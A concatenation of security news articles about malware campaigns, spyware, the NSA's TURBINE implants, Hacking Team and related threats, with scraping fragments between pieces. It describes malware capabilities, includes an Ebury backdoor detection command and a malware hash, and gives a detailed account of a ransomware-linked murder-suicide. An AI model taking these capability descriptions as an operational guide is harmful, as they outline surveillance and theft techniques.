verifies the source code of PMS (from different Android versions) to identify any violation of a set of security constraints, in which we expect that the attributes, properties (name, permission, UID, etc.) and data of a third-party app will not affect the installation and configurations of system apps during an update,” the researchers explained. “A Pileup flaw is detected once any of those constraints are breached.” All the six vulnerabilities have been reported to Google by the researchers, from which one of it has been fixed by them." }

Since a vast majority of bank ATMs around the world currently runs on Windows XP, but if they’ll continue sticking to it after the deadline, then they’ll be exposed to all kinds of security threats, as Microsoft will no longer provide the security patches thereafter. Many countries’ Banks have got a way out, many banks have arranged or are in the process of arranging extended support for Windows XP for which they are ready to pay Microsoft millions of dollars, but may be not in the case of India. Yes, India will never feed Microsoft for providing extra support to the older version; rather they could switch over to the Linux operating system. India has around 115,000 ATMs across the country at present and the counts will go up in coming days, but the end of life for XP will not affect banks and functioning of ATMs as the financial institutions across the country are well prepared for life without the much popular OS, according to the Indian Banks Association (IBA). ATMs will continue to run the outdated system for some time past the expiration date, thanks to Windows Embedded powering ATMs, cash registers. According to Microsoft, Windows XP Embedded is less susceptible to viruses, and the company is providing support for it until early 2016. IBA says neither branches nor cash vending machines will be shut down once Microsoft stops support for the system from April 8. Many Banks have already moved to Windows 7, or are in the process of moving, which will require hardware upgrades and some are considering to choose Linux. These hardware upgrades and software enhancements might be a costly headache for ATM manufacturers and banks, but the improvements are a win for customers who use these machines on a daily basis. \"Banks are definitely well-prepared and the industry is seized of the matter. I am very sure that you will not see a problem where ATMs or bank counters are shut because of this,\" said the industry lobby's chief executive MV Tanksale at an event in Mumbai. \"Only the old ATMs may face some problem as all the newer machines are running on newer platforms,\" he added. Indian banks do not themselves operate their ATMs, rather outsource them to third-party vendors like Diebold and NCR. Girish Chavan, national manager of Diebold said, \"all ATMs are not connected to the Internet so a hacker would need to reach it through the bank’s network,....and to breach a bank’s firewall is not easy.” But maybe firms are underestimating the tactics of hackers and cybercriminals, who are always one step ahead in hacking ATMs and defeating all current security mechanisms. A few months back it was revealed at the Chaos Computing Congress that hackers in Europe are targeting ATM Machines using Malware-loaded USB drives to steal money. The malware infection rate for Windows XP is already almost six times higher than Windows 8 systems. So, to switch on to the other operating system will benefit the organizations and financial institutions. Moreover, Indian ATM manufacturer Vortex offers a low-power Linux based system called Ecoteller, for example, that's being used in developing countries. The Reserve Bank of India had highlighted the issue on Tuesday, saying banking operations may be hit once the Windows XP gets phased out. \"Banks are definitely well prepared and the industry is seized of the matter. I am very sure that you will not see a problem where ATMs or bank counters are shut because of this,\" chief executive MV Tanksale said. \"The probability of attacks on such a system may increase and it may be difficult to defend such attacks in the absence of Microsoft support,\" RBI had said in a circular to banks. The Tamil Nadu State Government's has recently advised all its departments to move on to free open source software BOSS Linux as a key benefit of it will ultimately be a huge saving to the government. \"Consider installing BOSS (Bharat Operating System Solutions) Linux as one of the mandatory operating system,\" said the order issued by the TN Information Technology Department. \"The huge investment cost involved in purchasing closed source software (such as Windows XP) may be avoided, which in turn translates into huge savings for the government,\" the order stated. So, if your Bank is planning to upgrade their ATMs, should it be Windows 7/8 or Linux??" }

Google glass would definitely be the next must-have device. It’s non-other than a small computer you wear like eyeglasses allows you to surf the Web, email, text, take photos, live videos and more, -- all hands free. Google Glasses are yet in very limited release, but researchers have developed the world’s first spyware that could hijack your Google’s Glass computer eyepieces. Two Polytechnic graduate researchers, 22-year-old Mike Lady and 24-year-old Kim Paterson, from California designed an app that has the capability to convert the Google Glass into a Spy Camera, click a photo every ten seconds without giving any visible sign to the wearer, Forbes reported yesterday. The malware app developed by the researchers, masquerades itself as a fair piece of note-taking software, ironically dubbed as ‘Malnotes’, that trick users accept the permissions which allow them to capture images of whatever the glass wearer is looking at, in every 10 seconds when Glass’s display is turned off and uploads them to the remote server. Although, it’s Google’s developer policy which specifically ban apps that capture images while the device display is off, but the two California researchers proved that there were no real security prohibitions to enforce this policy. Forbes reported that in a short video interview with the researchers, the Google Glass handset running Malnotes belonging to Mike Lady apparently uploaded more than 150 snapshots of his vision, with no indication for either him or any other person. “The scary thing for us is that while it’s a policy that you can’t turn off the display when you use the camera, there’s nothing that actually prevents you from doing it,” says Paterson. “As someone who owns Glass and wants to install more apps, I’d feel a lot better if it were simply impossible to do that. Policies don’t really protect us.” The researchers were successful in uploading the malicious app into the Google app store which was subsequently removed from the Google when the news broke. But, when their professor tweeted about their work and received a response from a Google staffer, they didn’t bother to try uploading the app to Google MyGlass app store. Such malicious apps could be served via 3rd party app stores or could be installed using a USB cable via computer, when in debug mode. Just yesterday, we have reported about a Windows Spy tool that can even install a spyware app to Android devices connected to the infected computer. The Google spokesperson stated in response, \"Right now Glass is still in an experimental phase and has not been widely released to consumers. One goal of the Explorer program is to get Glass in the hands of developers so they can hack together features and discover security exploits.\"" }

If you are using windows operating system and Android devices, then it’s a bad news for you, because FireEye Security Researchers have identified a new piece of windows malware that can also infects your Android Devices. During an investigation of a targeted attack on a US based financial institution, researchers spotted a new version of Windows Remote Access Trojan (RAT) called 'Win-Spy Software Pro v16', a spying and monitoring tool. WinSpy was embedded in macro documents to kick off a spam campaign via a spear phishing email. “The recent surge in Android-based RATs such as Dendroid and AndroRAT shows a spike in the interest of malicious actors to control mobile devices. GimmeRAT is another startling example of malicious actors venturing into the Android ecosystem,” security firm said. The Researchers dubbed the Android spying component pre-loaded with WinSpy as GimmeRat, that allow hackers to control the victims’ device by using their own phone remotely over SMSs, or alternatively through a Windows-based controller. \"We also discovered various Android components that can be employed to engage in surveillance of a target.\" security firm said in a blog post. To install the Android malware, WinSpy communicates with mobile devices connected to the infected computer using a command line tool called Android Debug Bridge (ADB), that allows the Windows malware to execute commands on the Android device. ADB is a legitimate tool and part of the official Android software development kit (SDK). If USB debugging Mode is enabled on the device, it initiates the installation process. The new Android components also smooth the ways for surveillance of the target and there are three different applications that are part of the Android surveillance package. “We have found three different applications that are a part of the surveillance package. One of the applications requires commandeering via a window controller and requires physical access to the device while the other two applications can be deployed in a client-server model and allow remote access through a second Android device,” wrote the researchers. The technique is now new, Similar payload was used by other windows malware called ‘Trojan.Droidpak’ to infect Android Device, that was discovered by Antivirus firm Symantec in January. Using Android malware, the attackers could trace victims’ GPS location, can take screenshots of victims’ devices and could send these data to the remote Command-and-Control servers. Trojan is also perfect in monitoring the device' text messages. \"The hostname, port, username, and password are used to connect to the attackers’ FTP server to send screenshots, which is explained, in a later section. Once this intent is received the GlobalService is restarted with the interval parameter..\" FireEye said. When Windows system infected with WinSpy, an attacker can take screenshots, log keystrokes and even can also use it to open a backdoor for remote commands, upload and download of more files and the execution of remote commands. With the widespread use of Smartphones, the adoption of the mobile platforms such as Android has been increased, and so the new market of cyber criminals demands for RATs to support these platforms. Such interesting tactics can be used to serve fake Mobile Banking apps.. Fairly evil Ideas!" }

By creating an account you are agreeing to our Privacy Policy,\" as the content of an email sent out as part of the spam campaign states. The second half are links in the email written in Slovak that may lead you to several sites, one of which is a phishing site; it also contains a zipped attachment containing an application that masquerade to be an access code, but is actually a known backdoor Trojan detected as BKDR_ANDROM.ATG, that can serve as another vehicle to infect your computer. \"In the past, we have reported several spam attacks that banked on the success and popularity of online games in order to proliferate malware. Games like World of Warcraft and Grand Theft Auto IV were also leveraged before by spammers,\" Trend Micro wrote in its Threat Encyclopedia. \"Clearly, the worldwide success of these games makes it a good social engineering lure to trick users. In this specific case, spammers capitalized on the much-anticipated release date of Grand Theft Auto V on PC, Xbox One, and PS4.\" The cyber criminals are very smart for having a proper grip on the people’s intentions and by disguising themselves as the popular game, popular websites in order to spread malware to the victims’ computer or in some cases successfully able to fetch financial details of victims. We also had aware you about many such incidences in which cyber criminals are taking advantage of the popular gaming apps, like we previously informed about the Flappy Bird gaming app which infected number of users. So, it is advised you to do not click any link precipitately that seems too good to be true and always be careful and alert when it comes to spammed mails such as those which do not exist at all in reality." }

Antivirus Firm ESET's Reseacher team has been tracking and investigating the operation behind Linux/Ebury and today team uncovers the details [Report PDF] of a massive, sophisticated and organized malware campaign called 'Operation Windigo', infected more than 500,000 computers and 25,000 dedicated servers. 'We discovered an infrastructure used for malicious activities that is all hosted on compromised servers. We were also able to find a link between different malware components such as Linux/Cdorked, Perl/Calfbot and Win32/Glupteba.M and realized they are all operated by the same group.' ESET reported. Malware used in Operation Windigo: Linux/Ebury – an OpenSSH backdoor used to keep control of the servers and steal credentials. Linux/Cdorked – an HTTP backdoor used to redirect web traffic. We also detail the infrastructure deployed to redirect traffic, including a modified DNS server used to resolve arbitrary IP addresses labeled as Linux/Onimiki. Perl/Calfbot – a Perl script used to send spam. The Group behind the attacks may have been active since December 2012, using a modified version of OpenSSH, an open source alternative to proprietary Secure Shell Software (SSH) to infect thousands of servers and desktop computers, apparently, stole user credentials on system and SSH private keys for outgoing SSH connections. \"According to our analysis, over 25,000 servers have been affected over the last two years. More than 10,000 of them are still infected today.\" ESET reported, \"using the Linux/Ebury OpenSSH backdoor\" Hackers have accessed a wider range of compromised machines, used them to redirect half of a million web visitors to malicious websites and abusing the server bandwidth to send more than 35,000,000 spam messages per day. If victim will use a Smartphone to surf the malicious link from Spam mails, they will be redirected to Porn sites, with the intention of making money. High-profile Targets: Report listed some affected high profile servers and companies, including cPanel (famous web hosting control panel) and Linux Foundation’s kernel.org (main repository of source code for the Linux kernel). ESET Researchers collaborated with CERT-Bund, the European Organization for Nuclear Research (CERN), the Swedish National Infrastructure for Computing and other agencies to fight against this malware campaign. Affected Operating systems include Linux, FreeBSD, OpenBSD, OS X, and even Windows (with Perl running under Cygwin) and affected countries are US, Germany, France, Italy, Great Britain, Netherlands, Russian Federation, Ukraine, Mexico and Canada. How to Check, if you have been compromised? If you use only 'ssh -G' command, a clean server will print: 'ssh: illegal option -- G', but an infected server will only print the usage. Administrators can use the following UNIX/Linux command to check: $ ssh -G 2>&1 | grep -e illegal -e unknown > /dev/null && echo \"System clean\" || echo \"System infected\" If your system or server was also compromised in the same campaign, it's recommended to re-install the system or re-set all passwords and private OpenSSH keys." }

If you are a bitcoins holder then you might be aware of MtGox, Once the World's biggest Bitcoin exchange. MtGox filed for bankruptcy last month after saying it lost some 8,50,000 Bitcoins to hackers and suddenly went dark with no explanations. A few days ago, some unknown hacker breached into the personal blog and Reddit account of MTgox CEO, Mark Karpeles to level charges of fraud. But, Hackers are very clever to avail every eventuality they get. After compromising the MtGox CEO's blog, the hacker posted a 716MB ZIP file, MtGox2014Leak.zip, which contains the data dump and specialized software tools for remote access to MtGox data, but these software tools turned out to be a Bitcoin wallet stealing malware, according to the research carried out by the Kaspersky Lab Expert, Sergey Lozhkin. The application was actually a malware, which was created to search and steal Bitcoin wallet files from the victims’ computer. The hackers took advantage of the people keen interest in the latest MtGox topic that abruptly stopped trading because of security lapse. The Executable uploaded along with the archive tricks users into believing that they have access to databases of MtGox using the software, which is in fact a Bitcoin Miner. So, the whole MtGox leak was invented to infect the victims’ computers with Bitcoin stealer malware. \"We detect the Windows Trojan (MD5:c4e99fdcd40bee6eb6ce85167969348d), a 4.3MB PE32 executable, as Trojan.Win32.CoinStealer.i and OSX variant as Trojan.OSX.Coinstealer.a. Both have been created with the Livecode programming language – an open-source and cross-platform application development language.\" according to Kaspersky. The malware works on both Mac OS X and Windows, executes the TibanneSocket.exe binary. It would seek out bitcoins (bitcoin.conf and wallet.dat files) on an infected computer and then send them to the Command and Control server of the malware, which was located in Bulgaria, but down for now. Readers are advised to keep an eye on the spam emails, dressed up to look like MtGox emails and asking for MtGox and bank account details. Do not download softwares from non-trusted sources and keep your antivirus up-to-date. Stay Secure!" }

It’s true! This could be an extent of Ransomware that has marked its history by someone’s blood. Marcel Datcu, a 36 year old man, living in the village of Movila Miresii, who was married in 2013 and living happily with his family, killed his 4 year old baby and then himself committed suicide after his computer got infected with “police ransomware,” a Romanian Newspaper, Braila24 reports. Ransomware is one of the most blatant and obvious criminal's money making schemes out there, from which Cryptolocker threat had touched the peak, and cyber criminals have developed many Cryptolocker versions (prisonlocker, linkup, icepole, cryptobit) by which you have to safeguard your system. According to the sources, it seems that Marcel had opened few porn sites and infected with a computer virus, i.e., a police ransomware, that displayed a message coming from the Police, informing that he has been fined by the authorities for the violation of the law with a huge amount of 70.000 lei (€15,519 / $21,637) that need to be paid immediately. After getting such warning from the police, he felt shamed and scared that his young son would pay for his mistake and his life would be spend in the moment of delusion, so he hanged himself in the living room, holding his 4-year-old boy in his arms with a rope around his neck. His neighbors said that besides the boy who was killed by his father, Marcel and his wife had three other children from previous marriages, and was a happy family. Sources close to the investigation say that the man left the following suicide note to his wife: “I don’t think it’s normal what I’ve done (…) I apologize to all of you (…) I received a warning that said I have to pay 70.000 lei or go to prison for 11 years (…) I don’t want Nicusor [the small boy who was killed] to suffer because of me (…) I can’t stand going to prison. I can’t!” As far as we all know, a Police ransomware usually asks a victim to pay a small fine that last around $200 or €200. The man would have been died imagining that such a large fined amount is very difficult to pay. Cyber security experts always advises you not to pay the ransom amount that blocks your activities on the computer, as these threats can be easily removed by dedicated tools specially designed to remove such infections. But, unfortunately everybody is not aware of such threats and this time the price paid was somebody’s life. There are many ways you can protect your computers and devices from the widely spreading Ransomware discussed in our previous post. Stay Safe! Stay Tuned!" }

I know you won’t be feeling free considering your privacy, but, this is what the NSA is doing to you. The new revelation from the Glenn Greenwald’s desk remove the mask from one more secret surveillance operation carried out by the US intelligence agency NSA, the extensive program dubbed as ‘TURBINE’, according to the classified files provided previously by NSA whistleblower Edward Snowden. Yes, the NSA, who has been working with its dedicated hacking unit, Tailored Access Operations (TAO) from the past several years on enlarging its caliber to infect devices with spyware and creating its own command-and-control servers to manage millions of infected systems at a time. The secret documents presented by The Intercept website shows that the NSA with its British counterpart GCHQ are spreading a surveillance malware on computers and networking devices, “implants” that is capable to spam out millions of pieces of sophisticated malware at a time, that has been successively deployed over 50,000 Computer Network Exploitation (CNE) around the world and their number was expected to reach 85,000 by the end of 2013. CHALLENGE FOR NSA - One presentation from 2009, marked top secret explained that the agency was dealing with a great challenge for an active SIGINT/attack is ‘scale’, and infecting a huge number of machines and casting a wide net for data collection, the Human drivers limit the ability for large-scale exploitation, because humans tend to operate within their own environment, not taking into account the bigger picture. PROJECT TURBINE, THE NSA's SOLUTION - “Top-secret documents reveal that the National Security Agency is dramatically expanding its ability to covertly hack into computers on a mass scale by using automated systems that reduce the level of human oversight in the process,” wrote the journalist. So, Rather than limit such actions to human operatives, an automated system that was capable of managing malware implants is codenamed TURBINE in the revealed document, which was designed to allow the current implant network to scale to large size, i.e., millions of implants, this would be possible by creating a system that does automated control implants by groups instead of individual. NSA TARGETED FACEBOOK - The NSA allegedly used a ‘man-on-the-side’ attack to target and infect millions of computers. The NSA also used “man-in-the-middle” attack to spread the malware, rather than relying on old tactics like Spamming links via emails. The agency disguises itself as a fake Facebook server and trick unsuspecting users to log in thinking they were connecting to real Facebook’s server. So that the NSA could hack into users' systems and covertly stole out data from its hard drive. “In some cases the NSA has masqueraded as a fake Facebook server, using the social media site as a launching pad to infect a target’s computer and exfiltrate files from a hard drive. In others, it has sent out spam emails laced with the malware, which can be tailored to covertly record audio from a computer’s microphone and take snapshots with its webcam. The hacking systems have also enabled the NSA to launch cyber attacks by corrupting and disrupting file downloads, or denying access to websites.” MALWARE PLUGIN: NSA has also developed multiple plug-ins or add-ons for their malware: UNITEDRAKE - capable to gain complete control of an infected computer. CAPTIVATEDAUDIENCE- can hack computer’s microphone to record conversations taking place near the device. GUMFISH - can covertly take over a computer’s web cam and snap photographs. FOGGYBOTTOM - records logs of Internet browsing histories and collects login details and passwords used to access websites and email accounts. GROK - a Keylogger Trojan, that logs keystrokes. SALVAGERABBIT - to access data on removable flash drives that connect to an infected computer. \"It is unclear how many of the implants are being deployed on an annual basis or which variants of them are currently active in computer systems across the world.\" Glenn Greenwald said. I HUNT SYS ADMINS, NOT TERRORISTS: According to the documents, an internal post titled as “I hunt sys admins”, makes it very clear that, terrorists are not the primary target of the NSA and this could be in the context of the attacks such as - Belgacom hacks, where GCHQ (Government Communications Headquarters) duped those Belgian based telecoms workers with bogus LinkedIn pages that infected their computers.

According to a report, Cyber criminals and state-sponsored hackers are developing 55,000 new malware variants, each and every day; and many of them try to elevate privileges for unfettered control of the user device. North Carolina State University Researchers have developed a new software, called Practical Root Exploit Containment (PREC), with the sole purpose of detecting mobile malware that attempts to run Root exploits in Android devices. Root exploits take control of system administration functions of the operating system that gives the hacker an unrestricted control of user’s Smartphone. That means, an application has not permission to read your messages or contacts or the GPS location, but after getting root access it will be able to steal any data from your device. Anomaly Detection is one of the existing detection technique that compares the behavior of a downloaded Smartphone application, such as Google Chrome, with a database of how the application should be expected to behave. \"When deviations from normal behavior are detected, PREC analyses them to determine if they are malware or harmless 'false positives.' \" PREC tool used the refined techniques of Anomaly Detection to prevent it from giving false positives, \"Anomaly detection isn't new, and it has a problematic history of reporting a lot of false positives,\" said Dr Will Enck, co-author of the research paper. PREC targets the code written in C language which is usually used by hackers to create malware and can identify calls made to native C code from a Java program. The researchers tested a prototype of the tool on the Google Galaxy Nexus device against 150 Android apps, of which 10 contained root exploits. “We can achieve 100 percent detection rate and raised false alarms in one out of 140 popular apps tested,” he said. Malware writers have developed techniques that hide malware until the application is installed on the Smartphone but thanks to Google, most apps in the Android Play store are pretty clean, but the best protection is common sense; Ensure you only Install Apps from Trusted Sources." }

The official seller of Dendroid is identified as “Soccer” and it endow with amazing features that have never been offered before this. Symantec believes that there is a strong marketplace for such malicious tools. Even on PC platform, many crimeware toolkits like Zeus (Trojan.Zbot) and SpyEye (Trojan.Spyeye) performed high profile crimes. Such toolkits became popular due to ease of use. Symantec is also observing over Dendroid and advice users to install Norton Mobile Security to detect this threat. According to a well-known report, Android is a dominant player in spreading mobile malware. Due to open source platform, Android is on the target of cyber criminals. Many experts have also predicted that the year of 2014 will be of malware attacks and data theft.

It’s difficult to recognize spyware as it is becoming more complex and sophisticated with time, so is spreading most rapidly as an Internet threat. Recently, The security researchers have unearthed a very complex and sophisticated piece of malware that was designed to steal confidential data and has ability able to capture network traffic. The Researchers at the German security company G Data Software, refer the malware as Uroburos, named after an ancient symbol depicting a serpent or dragon eating its own tail, and in correspondence with a string (Ur0bUr()sGotyOu#) lurking deep in the malware's code. The researchers claimed that the malware may have been active for as long as three years before being discovered and appears to have been created by Russian developers. Uroburos is a rootkit designed to steal data from secure facilities, has ability to take control of an infected machine, execute arbitrary commands and hide system activities, communicating primarily using peer-to-peer connections in a network it has penetrated to infect new machines within the network, manages to pass back the exfiltrated information back to attackers from infected machines and network data, the researchers explained. The two main components of Uroburos are - a driver and an encrypted virtual file system, used to disguise its nasty activities and to try to avoid detection. Its driver part is extremely complex and is designed to be very discrete and very difficult to identify. The malware uses two virtual file systems, one NTFS file system and one FAT file system, and both are stored locally on the infected system and are used as a \"workspace\" by the attackers, providing a storage space for third-party tools, post-exploitation tools, temporary files and binary output. The virtual file system can’t be decrypted without the presence of drivers, according to the Gdata’s analysis explained in the PDF. The driver is needed to decrypt the virtual file systems, to create several hooks to hide its activities, to inject libraries in the users land and to establish and manage some communication channels. “The development of a framework like Uroburos is a huge investment. The development team behind this malware obviously comprises highly skilled computer experts, as you can infer from the structure and the advanced design of the rootkit. We believe that the team behind Uroburos has continued working on even more advanced variants, which are still to be discovered.” WITH LOVE From RUSSIA: Technical Similarities with the previous malware Agent.BTZ and that the malware Uroburos checks the presence of Agent.BTZ in the system and remains inactive if Agent.BTZ is present, makes the researchers believe that it was designed by the same by the Russian intelligence services, according to G Data analysis. “Due to many technical details (file name, encryption keys, behavior and more details mentioned in this report), we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent.BTZ,” say the researchers. They also added that the reason it is meant to be of the Russian origin is, “Uroburos checks for the presence of Agent.BTZ and remains inactive if it is installed. It appears that the authors of Uroburos speak Russian (the language appears in a sample), which corroborates the relation to Agent.BTZ. Furthermore, according to public newspaper articles, this fact, the usage of Russian, also applied for the authors of Agent.BTZ.” In 2008, USB and Removable storage drives placed on hold in the U.S. Army facilities after the spread of Agent.BTZ worm. The USB stick contained malicious code was trying to keep on multiplying further and infected the military’s network. The attacks carried out with Uroburos are targeting government institutions, research institutions, intelligence agencies, nation states, research institutions or companies dealing with sensitive information as well as similar high-profile targets. The oldest drivers identified by the researchers was compiled in 2011 is the evidence that the malware was created around three years ago and was undetected. “The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed in this Environment,” the G Data concluded. The team behind the development of the malware Uroburos has developed an even more sophisticated framework, which still remains undiscovered, the researchers believe. Many infection vectors are conceivable. E.g. Spear phishing, drive-by-infections, USB sticks, or social engineering attacks." }

Tilon a.k.a SpyEye2 is the sophisticated version of SpyEye Trojan. Majority functional part of the malware is same as of the SpyEye banking Trojan that was developed by a 24-year-old Russian hacker 'Aleksandr Andreevich Panin' or also known as Gribodemon, who was arrested in July 2013. ‘SpyEye’, infected more than 1.4 million Computers worldwide since 2009, designed to steal people’s identities and financial information, including online banking credentials, credit card information, user names, passwords and PINs. It secretly infects the victim’s computer and gives the remote control to the cybercriminals who remotely access the infected computer through command and control servers and steal victims’ personal and financial information through a variety of techniques, including web injects, keystroke loggers, and credit card grabbers without authorization. Researchers have confirmed that, the team who had developed the SpyEye is the same who created Tilon, and that is why it was labeled as SpyEye2. “The team behind its creation was similar, however, reinforced with at least one better skilled programmer,” said the researchers, adding, “The management of SpyEye2 is done through a single, unified interface, which has been completely redesigned but still contains a few of the unique features of the original SpyEye.” An interesting part of SpyEye2, which the researchers found ‘slightly funny’, is that the malware check for the removal of the older version of SpyEye installed in the infected system and replace it with the new version, i.e. SpyEye2 with better stability features. “No other malware families are checked for removal. Early versions of the original SpyEye were likewise equipped with a feature to remove older versions of ZeuS installed on the infected system,” researchers say. According to the researchers, “only the Loader portion of Tilon is sourced from Silon, but this is where the similarity ends. As shown above and further illustrated in the Appendices, the body (i.e., functional portion) of Tilon was actually based on SpyEye.” Also, another reason to consider Tilon as SpyEye's variant is its success, which was in the wild from 2012 to 2014, and suddenly seems to be over as the SpyEye author arrested last year. Fox-IT researchers say, “the arrests, like Gribodemon and other key figures in the underground economy, such as Paunch, the author of the popular Blackhole Exploit Kit, is the key to decreasing the worldwide activity around online crime.” It doesn’t mean that the malware won’t circulate its fraudulent activity in the future, but will finally come to an end after nearly a year of declining usage." }

The research shows that this kind of attack is undetectable to any Antivirus and Wireless Intrusion Detection System (IDS). \"Hence, this attack is considered advanced and difficult to detect, as IDS rogue AP detection methods typically rely on a change in credentials, location or traffic levels.\" The Density of Access points in a certain geographical area increases the security issues for wireless networks, because it spreads very quickly at high speed in an area having denser Access Point availability. “WiFi connections are increasingly a target for computer hackers because of well-documented security vulnerabilities, which make it difficult to detect and defend against a virus,” says Marshall, Co-author of the research paper. However, the virus itself doesn’t exist in the wild and created for the demo purpose in the research lab only, though it is very likely that a malicious version could be created and released into the wild by cyber criminals and malware writers." }

PONY is after You. A Group of cyber criminals has used hundreds of thousands of infected computers of the digital currency holders to filch approximately $220,000 worth of Bitcoins and other virtual currencies. The researchers at the security firm, Trustwave have uncovered the Bitcoin Heist that was accomplished by the computers infected with a new class of malware that has been dubbed as ‘Pony’, a very powerful type of Spying Keylogger Malware with very dangerous features that was last time found two months ago. Pony, for those who have not yet heard about it, is a bot controller much like any other, with the capability to capture all kinds of confidential information and access passwords. It contains a control panel, user management, logging features, a database to manage all the data and, of course, the statistics. It can see the passwords and login credentials of infected users when they access applications and Internet sites. The security firm has found that the botnet has infected over 700,000 accounts in four months of the period, between September 2013 and mid-January 2014, and allowed criminals to control those accounts. “Not only did this Pony botnet steal credentials for approximately 700,000 accounts, it’s also more advanced and collected approximately $220,000 worth, at the time of writing, of virtual currencies such as BitCoin (BTC), LiteCoin (LTC), FeatherCoin (FTC) and 27 others,” reads the report. In December, the same piece of malware infected a number of popular websites and services such as Facebook, Google, Yahoo, Twitter, LinkedIn, etc., by stealing a couple of million passwords, that provide them access to all those accounts. Latest Pony attack This Time the Pony botnet stole over 700,000 credentials, including 600,000 website login credentials, 100,000 email account credentials, 16,000 FTP account credentials and other Secure Shell account information. “This instance of Pony compromised 85 wallets, a fairly low number compared to the number of compromised credentials. Despite the small number of wallets compromised, this is one of the larger caches of BitCoin wallets stolen from end-users.” The Malware was in the wild when the virtual currency, such as Bitcoin value touched the sky, which was developed by cryptographic experts as a way to move money at a lower cost than traditional financial systems. \"Bitcoins are stored in virtual wallets, which are essentially pairs of private and public keys,\" the Trustwave researchers said, adding that “whoever has those keys can take the currency, and stealing Bitcoins and exchanging them for another currency, even a regulated one such as US dollars, is much easier than stealing money from a bank.\" They said that cyber thieves with Bitcoins can use any number of trading websites, to get real cash while maintaining anonymity. NOT just BITCOINS Here, if you think that the botnet went after only the Bitcoin, then you are wrong. Currently, the Bitcoin value is swinging between $300 and $500. So, instead of sticking to only Bitcoin wallets, the Pony botnet looks for a list of virtual currencies including Anoncoin, BBQcoin, Bytecoin, Craftcoin, Devcoin, Digitalcoin, Fastcoin, Feathercoin, Florincoin, Franko, Freicoin, GoldCoin, I0coin, Infinitecoin, Ixcoin, Junkcoin, Litecoin, Luckycoin, Mincoin, Namecoin, NovaCoin, Phoenixcoin, PPCoin, Primecoin, Quarkcoin, Tagcoin, Terracoin, Worldcoin, Yacoin and Zetacoin. If you are wondering that the attack was being shut down by some security companies, then you are guessing wrong, because the attackers themselves “closed shop” during January. Researchers haven't explained any Malware removal mechanism, but in order to protect your virtual currency, you are advised to encrypt your wallets. Keep your virtual currency wallets safe!

Security researchers from Bromium Labs recently found that YouTube advertising network has been abused by rogue advertisers to distribute malware. YouTube In-Stream Ads were redirecting users to malicious websites, hosting the 'Styx Exploit Kit' and was exploiting client side vulnerabilities by drive-by-download attack to infect users' computer with Caphaw Banking Trojan. The Exploitation process relied upon a Java vulnerability (CVE-2013-2460) and after getting dropped into the target computer system, the malware detects the Java version installed on the operating system and based upon it requests the suitable exploit. \"We don’t yet know the exact bypass which the attackers used to evade Google’s internal advertisement security checks. Google has informed us that they’re conducting a full investigation of this abuse and will take appropriate measures.\" researchers said. Further investigation has revealed that the banking malware uses Domain Generation Algorithm (DGA) for communicating with Command and Control server (C&C). The C&C panel of this Trojan seems to be hosted somewhere in Europe and the case is still under investigation. Caphaw Banking Malware has been marked as malicious by a number of anti-virus companies. How many users had become victim of this attack is yet a question. Google has taken down the malvertisment campaign and is beefing up internal procedures to prevent such events from occurring again. Oracle has already patched the respective Java vulnerability last year, So users are advised to keep their Java software up-to-date and install latest Security updates of the softwares and operating system." }

Yes, we are talking about Surveillance, but this time not about NSA. Instead, Countries including some with poor human-rights records and a much less technically advanced nation are the likely culprits, as they apparently used commercial spyware in making surveillance capabilities that once were the exclusive expertise of the known spy agencies, such as National Security Agency (NSA) and GCHQ. Citizen lab, a nonprofit research lab has found traces of a remote hacking tool in 21 countries, developed by Hacking Team, including Ethiopia, Sudan, Azerbaijan and Saudi Arabia, which the team had already denied back in 2013. Hacking Team, also known as HT S.r.l, is an Italian company, which is known for its powerful surveillance software, Remote Code System (RCS) that it sells to Governments and law enforcement agencies. Senior Counsel of Hacking Team, Eric Rabe stated that the company does not provide its products to 'repressive regimes.'\"On the issue of repressive regimes, Hacking Team goes to great lengths to assure that our software is not sold to governments that are blacklisted by the EU, the US, NATO, and similar international organizations or any “repressive regime.\"Remote Control System (RCS) is a malware, can be defined as 'instrument of crime', infects computers and Smartphones in order to enable covert surveillance. The company claims that its Trojan once installed in the victims’ computer, can intercept encrypted communication, including emails and Skype voice calls. Furthermore, RCS can turn on a device’s webcam and microphone to spy on the user without their knowledge. The Team prominently advertises that their RCS spyware is \"untraceable\" to a specific government operator and can be installed remotely. They say that it can scale up to monitor \"hundreds of thousands of targets\" and is capable of being deployed to Apple, Android, Symbian, and Blackberry mobile devices.\"Hacking Team has made a number of statements that seem intended to reassure the public, as well as potential regulators, that they conduct effective due diligence and self-regulation regarding their clients, and the human rights impact of their products,\" the Citizen Lab researchers report on Monday. \"They also market their RCS product as untraceable. Our research suggests that both of these claims ring hollow.\" The researchers at Citizen Lab have found traces of Remote Control System (RCS) by mapping the spyware's network of proxy servers, which the Hacking Team claims that RCS is \"untraceable.\"\"Our research reveals that the RCS collection infrastructure uses a proxy-chaining technique, roughly analogous to that used by general-purpose anonymity solutions like Tor, in that multiple hops are used to anonymize the destination of information,\" reads the report. \"Despite this technique, we are still able to map out many of these chains and their endpoints using a specialized analysis.\" Citizen Lab researchers explained. On the basis of tracing endpoints of Hacking Team proxy chains, the researchers suspected that the agencies of 21 Governments are current or former Clients of RCS, and the country names are Azerbaijan, Colombia, Egypt, Ethiopia, Hungary, Kazakhstan, Korea, Malaysia, Mexico, Morocco, Nigeria, Oman, Panama, Poland, Saudi Arabia, Sudan, Thailand, Turkey, UAE, Uzbekistan, including Italy which is the homeland of the Hacking Team. The Governments are targeting for political advantage, including the US-based news Organization, rather than using it for legitimate law enforcement operations. According to researchers at Citizen Lab, The No.1 suspect is Ethiopian Government, that used the hacking tool created by Hacking Team to carry out the spying operation against the Ethiopian journalists in the United States and Europe. Hacking Team to Citizen Lab:“We have established an outside panel of technical experts and legal advisors, unique in our industry that reviews potential sales. This panel reports directly to the board of directors regarding proposed sales.”However The FBI, which investigates Computer crimes, declined to comment on the Citizen Lab report, but an activist at the Electronic Frontier Foundation (EFF) and an expert in surveillance technology, Eva Galperin said that:\"If the Ethiopian government is not a Hacking Team customer, then I would sure like to know how their tools wound up being used to spy on Ethiopian journalists.\"" }

